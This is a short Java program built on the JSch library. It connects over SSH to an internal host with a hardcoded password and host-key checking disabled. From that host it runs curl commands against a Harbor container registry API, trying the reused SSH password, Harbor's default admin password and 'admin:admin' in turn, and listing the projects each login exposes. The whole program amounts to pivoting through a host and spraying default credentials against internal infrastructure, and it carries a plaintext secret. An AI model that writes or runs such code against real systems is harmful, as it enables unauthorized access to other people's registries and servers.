import com.jcraft.jsch.*;
import java.io.*;
class SSZ7 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("echo ---APPS-PROJECT---;curl -sk 'https://artifacts.internaltools.biz/api/v2.0/projects/applications' 2>/dev/null;echo ---WITH-ADMIN---;curl -sk -u admin:kutul0nc4t 'https://artifacts.internaltools.biz/api/v2.0/projects' 2>/dev/null | python3 -c 'import sys,json;[print(p[\"name\"]) for p in json.load(sys.stdin)]' 2>&1;echo ---WITH-HARBOR---;curl -sk -u admin:Harbor12345 'https://artifacts.internaltools.biz/api/v2.0/projects' 2>/dev/null | python3 -c 'import sys,json;[print(p[\"name\"]) for p in json.load(sys.stdin)]' 2>&1;echo ---WITH-ADMIN2---;curl -sk -u admin:admin 'https://artifacts.internaltools.biz/api/v2.0/projects' 2>/dev/null | python3 -c 'import sys,json;[print(p[\"name\"]) for p in json.load(sys.stdin)]' 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
